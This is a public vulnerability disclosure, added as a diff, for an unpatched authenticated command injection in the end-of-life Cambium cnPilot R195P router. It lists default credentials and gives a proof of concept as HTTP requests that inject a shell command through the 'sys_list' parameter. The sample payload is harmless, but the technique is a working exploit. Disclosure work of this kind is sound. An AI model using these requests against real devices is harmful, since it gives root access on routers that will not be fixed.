@@ -1,0 +1,38 @@
+Public Vulnerability Disclosure - Unpatched Authenticated OS Command Injection in Cambium cnPilot R195P
+
+
+Exploit Title: Cambium Networks cnPilot R195P - OS Command Injection
+Date: 2026-02-16
+Product: Cambium Networks cnPilot R195P
+Exploit Author: Rose/prism131
+Vendor Homepage: https://www.cambiumnetworks.com/
+Version: 2.16.18
+Tested on: Embedded Linux / GoAhead-Webs
+
+Description:
+A critical vulnerability exists in the web administration interface of the Cambium Networks cnPilot R195P router. The application fails to properly sanitize user input sent to the /goform/execute_script endpoint via the 'sys_list' parameter. This allows an authenticated attacker using default credentials (useradmin:admin, admin:admin, user:user) to inject arbitrary shell commands which are executed as root.
+
+The execute_script function is designed to execute system functions based on the sys_list parameter. However, the handler passes this parameter directly to a system shell without proper sanitization.
+
+NOTE: This device is End-of-Life (EOL). The vendor has been notified but no patch is expected. Immediate replacement or isolation of the device is recommended.
+
+PoC:
+```
+Step 1: Obtaining Valid Session
+POST /goform/websLogin HTTP/1.1
+Host: [TARGET_IP]
+User-Agent: meow/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+user_name=useradmin&password=admin
+
+The response returns: Set-Cookie: ASPSSIONID=xyz...
+
+Step 2: Arbitrary Shell Command Execution
+Once the cookie is obtained, the following request triggers the execution
+GET /goform/execute_script?sys_list=%24%28echo%20mrrp%20%3E%20meow.txt%29 HTTP/1.1
+Host: [TARGET_IP]
+Cookie: ASPSSIONID=[SESSION-ID]
+User-Agent: meow/1.0
+```
